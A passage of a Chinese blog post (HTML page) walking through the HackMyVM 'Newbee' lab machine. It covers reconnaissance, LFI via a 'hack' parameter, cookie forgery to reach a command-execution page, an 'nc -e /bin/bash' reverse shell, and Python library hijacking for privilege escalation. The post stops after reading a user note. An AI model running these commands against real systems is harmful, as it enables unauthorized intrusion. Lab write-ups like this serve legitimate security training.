@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/xxx/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lvzhouhang.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="信息搜集arp-scan -l 1234567891011┌──(root㉿kali)-[~&#x2F;Desktop&#x2F;tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https:&#x2F;&#x2F;gi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackmyvm-Newbee">
+<meta property="og:url" content="https://lvzhouhang.xyz/2025/03/26/Hackmyvm-Newbee/index.html">
+<meta property="og:site_name" content="lvzhouhang">
+<meta property="og:description" content="信息搜集arp-scan -l 1234567891011┌──(root㉿kali)-[~&#x2F;Desktop&#x2F;tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https:&#x2F;&#x2F;gi">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/872323857/images/master/img/Newbee1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/872323857/images/master/img/Newbee2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/872323857/images/master/img/Newbee3.png">
+<meta property="article:published_time" content="2025-03-26T12:10:10.000Z">
+<meta property="article:modified_time" content="2025-03-26T12:55:36.112Z">
+<meta property="article:author" content="lvzhouhang">
+<meta property="article:tag" content="靶机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/872323857/images/master/img/Newbee1.png">
+
+<link rel="canonical" href="https://lvzhouhang.xyz/2025/03/26/Hackmyvm-Newbee/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Hackmyvm-Newbee | lvzhouhang</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/clicklove.js"></script>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">lvzhouhang</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/03/26/Hackmyvm-Newbee/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lvzhouhang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lvzhouhang">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hackmyvm-Newbee
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-03-26 20:10:10 / 修改时间：20:55:36" itemprop="dateCreated datePublished" datetime="2025-03-26T20:10:10+08:00">2025-03-26</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HackMyVM/" itemprop="url" rel="index"><span itemprop="name">HackMyVM</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>14k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>13 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>arp-scan -l</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)</span><br><span class="line">192.168.31.2    08:00:27:f5:b9:af       PCS Systemtechnik GmbH</span><br><span class="line">192.168.31.122  00:0c:29:71:20:21       VMware, Inc.</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 2.384 seconds (107.38 hosts/sec). 3 responded</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>192.168.31.122就是ip地址</p>
+<p>nmap 192.168.31.122 -p-扫描端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# nmap 192.168.31.122 -p-</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-26 08:21 EDT</span><br><span class="line">Nmap scan report for 192.168.31.122</span><br><span class="line">Host is up (0.00090s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:71:20:21 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.71 seconds</span><br></pre></td></tr></table></figure>
+
+<h1 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h1><p>查看页面源码，在最下面可以发现有一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--Wrong paramter to GET--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>对get参数进行fuzz</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u &quot;http://192.168.31.122?FUZZ=/etc/passwd&quot; --hh 18851</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://192.168.31.122?FUZZ=/etc/passwd/</span><br><span class="line">Total requests: 220559</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload</span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000001799:   200        376 L    1270 W     18863 Ch    &quot;hack&quot;</span><br></pre></td></tr></table></figure>
+
+<p>能fuzz出来参数名为hack，但是页面最下方还是会报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- include failed try another file --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>尝试包含其他文件</p>
+<p>扫描目录可以扫描到一个secret.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# gobuster dir -u &quot;http://192.168.31.122/&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-m</span><br><span class="line">edium.txt -x .php,.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.31.122/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,txt</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.php                 (Status: 403) [Size: 279]</span><br><span class="line">/index.php            (Status: 200) [Size: 18852]</span><br><span class="line">/contact.php          (Status: 200) [Size: 8853]</span><br><span class="line">/about.php            (Status: 200) [Size: 10036]</span><br><span class="line">/blog.php             (Status: 200) [Size: 9782]</span><br><span class="line">/products.php         (Status: 200) [Size: 12163]</span><br><span class="line">/terms.php            (Status: 200) [Size: 6670]</span><br><span class="line">/assets               (Status: 301) [Size: 317] [--&gt; http://192.168.31.122/assets/]</span><br><span class="line">/testimonials.php     (Status: 200) [Size: 7907]</span><br><span class="line">/javascript           (Status: 301) [Size: 321] [--&gt; http://192.168.31.122/javascript/]</span><br><span class="line">/checkout.php         (Status: 200) [Size: 13307]</span><br><span class="line">/secret.php           (Status: 200) [Size: 2187]</span><br><span class="line">/.php                 (Status: 403) [Size: 279]</span><br><span class="line">/server-status        (Status: 403) [Size: 279]</span><br></pre></td></tr></table></figure>
+
+<p>secret.php可以执行命令，但是必须要先进行身份验证，用lfi包含secret.php试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.122/?hack=php://filter/convert.base64-encode/resource=secret.php</span><br></pre></td></tr></table></figure>
+
+<p>可以包含出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">#secret.php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;命令行控制台&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            background-color: #1e1e1e;</span><br><span class="line">            font-family: Consolas, monospace;</span><br><span class="line">            color: #fff;</span><br><span class="line">            margin: 0;</span><br><span class="line">            padding: 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .console &#123;</span><br><span class="line">            width: 80%;</span><br><span class="line">            margin: 50px auto;</span><br><span class="line">            padding: 20px;</span><br><span class="line">            background-color: #000;</span><br><span class="line">            border-radius: 8px;</span><br><span class="line">            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);</span><br><span class="line">            height: 400px;</span><br><span class="line">            overflow-y: auto;</span><br><span class="line">            font-size: 16px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .output &#123;</span><br><span class="line">            white-space: pre-wrap;</span><br><span class="line">            margin-bottom: 10px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .input-container &#123;</span><br><span class="line">            display: flex;</span><br><span class="line">            align-items: center;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .input-container .prompt &#123;</span><br><span class="line">            color: #00ff00;</span><br><span class="line">            margin-right: 5px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .input-container input &#123;</span><br><span class="line">            background: transparent;</span><br><span class="line">            border: none;</span><br><span class="line">            color: #fff;</span><br><span class="line">            width: 100%;</span><br><span class="line">            padding: 5px;</span><br><span class="line">            font-size: 16px;</span><br><span class="line">            outline: none;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .input-container input:focus &#123;</span><br><span class="line">            border: 1px solid #00ff00;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .input-container input::placeholder &#123;</span><br><span class="line">            color: #888;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .console-footer &#123;</span><br><span class="line">            padding-top: 10px;</span><br><span class="line">            color: #888;</span><br><span class="line">            font-size: 12px;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;console&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;output&quot; id=&quot;output&quot;&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line"></span><br><span class="line">        if (isset($_COOKIE[&#x27;AreYouAdmin&#x27;]) &amp;&amp; $_COOKIE[&#x27;AreYouAdmin&#x27;] === &#x27;Yes&#x27;) &#123;</span><br><span class="line"></span><br><span class="line">            if (isset($_GET[&#x27;command&#x27;])) &#123;</span><br><span class="line">                $command = $_GET[&#x27;command&#x27;];</span><br><span class="line">                $output = shell_exec($command);</span><br><span class="line">                echo &#x27;&lt;div&gt;\&gt; &#x27; . htmlspecialchars($command) . &#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">                echo &#x27;&lt;div&gt;&#x27; . nl2br(htmlspecialchars($output)) . &#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &#x27;&lt;div&gt;No permission to execute commands, lacking admin permission.&lt;/div&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;input-container&quot;&gt;</span><br><span class="line">        &lt;span class=&quot;prompt&quot;&gt;\&gt;&lt;/span&gt;</span><br><span class="line">        &lt;form method=&quot;get&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;text&quot; name=&quot;command&quot; id=&quot;input&quot; placeholder=&quot;command...&quot; autocomplete=&quot;off&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    const inputField = document.getElementById(&quot;input&quot;);</span><br><span class="line"></span><br><span class="line">    inputField.focus();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>伪造cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: AreYouAdmin=yes</span><br></pre></td></tr></table></figure>
+
+<p>然后反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.31.129 4444</span><br><span class="line">script -qc /bin/bash /dev/null #获得交互式shell</span><br></pre></td></tr></table></figure>
+
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@Newbee:/var/www/html/shop$ sudo -l</span><br><span class="line">sudo: unable to resolve host Newbee: Temporary failure in name resolution</span><br><span class="line">Matching Defaults entries for www-data on Newbee:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,</span><br><span class="line">    targetpw, use_pty</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on Newbee:</span><br><span class="line">    (debian) NOPASSWD: /usr/bin/python3 /var/www/html/vuln.py</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#vuln.py</span><br><span class="line">import random</span><br><span class="line">import time</span><br><span class="line">import math</span><br><span class="line">import string</span><br><span class="line">import datetime</span><br><span class="line"></span><br><span class="line">def generate_random_string(length=10):</span><br><span class="line"></span><br><span class="line">    return &#x27;&#x27;.join(random.choices(string.ascii_letters + string.digits, k=length))</span><br><span class="line"></span><br><span class="line">def pointless_computation():</span><br><span class="line"></span><br><span class="line">    number = random.randint(1, 1000)</span><br><span class="line">    result = math.sqrt(number) * math.log(number)</span><br><span class="line">    print(f&quot;Calculated math nonsense: sqrt(&#123;number&#125;) * log(&#123;number&#125;) = &#123;result&#125;&quot;)</span><br><span class="line"></span><br><span class="line">def simulate_time_wasting():</span><br><span class="line"></span><br><span class="line">    now = datetime.datetime.now()</span><br><span class="line">    print(f&quot;Started wasting time at &#123;now&#125;&quot;)</span><br><span class="line">    time.sleep(2)  # 故意睡眠 2 秒</span><br><span class="line">    later = datetime.datetime.now()</span><br><span class="line">    print(f&quot;Finished wasting time at &#123;later&#125;. Time wasted: &#123;later - now&#125;&quot;)</span><br><span class="line"></span><br><span class="line">def pointless_string_operations():</span><br><span class="line"></span><br><span class="line">    rand_str = generate_random_string()</span><br><span class="line">    print(f&quot;Generated random string: &#123;rand_str&#125;&quot;)</span><br><span class="line">    reversed_str = rand_str[::-1]</span><br><span class="line">    print(f&quot;Reversed string: &#123;reversed_str&#125;&quot;)</span><br><span class="line">    print(f&quot;String length: &#123;len(rand_str)&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    pointless_computation()</span><br><span class="line">    simulate_time_wasting()</span><br><span class="line">    pointless_string_operations()</span><br><span class="line">    print(&quot;All done. The script accomplished nothing useful.&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>可以在/var/www/html目录下创建一个random.py文件进行劫持，python文件会优先加载当前目录下的库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#random.py</span><br><span class="line">import os</span><br><span class="line">os.system(&quot;bash -p&quot;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@Newbee:/var/www/html$ sudo -u debian /usr/bin/python3 /var/www/html/vuln.py</span><br><span class="line">debian@Newbee:/var/www/html$</span><br></pre></td></tr></table></figure>
+
+<p>提到debian用户了，home目录下有一个note.txt和一个config.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debian@Newbee:~$ cat note.txt</span><br><span class="line">Damn it, I forgot my database password. I heard that Debian is currently building a message board, maybe he can help me</span><br></pre></td></tr></table></figure>
+
